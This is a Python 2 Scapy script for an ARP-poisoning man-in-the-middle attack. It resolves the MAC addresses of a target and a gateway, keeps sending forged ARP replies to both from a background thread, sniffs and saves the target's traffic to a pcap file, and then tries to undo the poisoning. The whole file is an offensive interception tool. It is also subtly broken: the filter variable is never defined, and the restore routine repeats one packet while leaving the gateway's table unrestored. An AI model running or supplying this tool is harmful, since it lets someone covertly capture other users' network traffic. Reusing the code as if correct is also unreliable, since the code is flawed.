from scapy.all import *
import os
import sys
import threading
import signal
import sys

interface = sys.argv[1]
target_ip = sys.argv[2]
gateway_ip = sys.argv[3]
packet_count = 1000
poisoning = True

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",
             hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",
             hwsrc=gateway_mac), count=5)

def get_mac(ip_address):
    responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)
    for s, r in responses:
        return r[Ether].src
    return None

def client(gateway_ip, gateway_mac, target_ip, target_mac):
    global poisoning
    client = ARP()
    client.op = 2
    client.psrc = gateway_ip
    client.pdst = target_ip
    client.hwdst = target_mac
    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    while poisoning:
        send(client)
        send(poison_gateway)
        time.sleep(2)
    return

conf.iface = interface
conf.verb = 0
gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    sys.exit(0)
else:
    print "[*] Gateway %s is at %s" % (gateway_ip, gateway_mac)

target_mac = get_mac(target_ip)

if target_mac is None:
    sys.exit(0)
else:
    print "[*] Target %s is at %s" % (target_ip, target_mac)

poison_thread = threading.Thread(target=client,
    args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

try:
    packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)
except KeyboardInterrupt:
    pass
finally:
    wrpcap(sys.argv[4], packets)
    poisoning = False
    poison_thread.join()
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)
